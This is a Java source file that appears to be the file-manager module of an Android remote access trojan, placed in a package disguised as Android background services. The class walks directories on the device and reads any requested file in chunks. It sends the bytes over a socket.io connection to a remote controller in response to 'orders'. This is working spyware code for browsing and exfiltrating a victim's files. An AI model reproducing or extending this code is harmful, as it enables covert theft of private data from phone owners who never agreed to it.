package com.android.background.services.managers;

import android.util.Log;

import com.android.background.services.socket.IOSocket;
import com.android.background.services.params.Orders;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.nio.file.Files;
import java.text.DecimalFormat;
import java.util.Arrays;

public class FileManager {

    private static final String TAG = "MADARA";

    public interface OnRetrievedFilesListener {
        void onRetrievedFiles(JSONArray filesInfo);
    }

    public static void walk(String path, OnRetrievedFilesListener listener) {

        new Thread(new Runnable() {
            @Override
            public void run() {

                JSONArray values = new JSONArray();

                File dir = new File(path);

                if (!dir.canRead()) {
                    Log.d("cannot", "inaccessible");
                }

                File[] list = dir.listFiles();

                try {
                    if (list != null) {

                        JSONObject parentObj = new JSONObject();

                        parentObj.put("name", "../");
                        parentObj.put("isDir", true);
                        parentObj.put("path", dir.getParent());
                        parentObj.put("size", "0");

                        values.put(parentObj);

                        for (File file : list) {

                            JSONObject fileObj = new JSONObject();

                            fileObj.put("name", file.getName());
                            fileObj.put("isDir", file.isDirectory());
                            fileObj.put("path", file.getAbsolutePath());
                            fileObj.put("fileLength", file.length());
                            fileObj.put("size", fileSizeFormatter(file.length()));

                            values.put(fileObj);
                        }
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "walk: ", e);
                }

                listener.onRetrievedFiles(values);
            }
        }).start();
    }

    public static void downloadFile(final String path) {
        if (path == null) {
            return;
        }

        // Create a new thread for the file transfer
        new Thread(() -> {
            File file = new File(path);

            if (file.exists()) {
                try {
                    BufferedInputStream bufferedInputStream = new BufferedInputStream(Files.newInputStream(file.toPath()));
                    byte[] buffer = new byte[512 * 1024]; // 512 KB chunks
                    int bytesRead;

                    while ((bytesRead = bufferedInputStream.read(buffer)) != -1) {
                        JSONObject object = new JSONObject();
                        object.put("file", true);
                        object.put("name", file.getName());
                        object.put("buffer", Arrays.copyOf(buffer, bytesRead));  // Only send the actual data size

                        IOSocket.getInstance().getIoSocket().emit(Orders.FILE_BYTES, object);
                    }

                    bufferedInputStream.close();
                } catch (Exception e) {
                    Log.e(TAG, "downloadFile: ", e);
                }
            }
        }).start();  // Start the thread
    }


    public static String fileSizeFormatter(long size) {
        if (size <= 0) return "?";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return new DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }
}
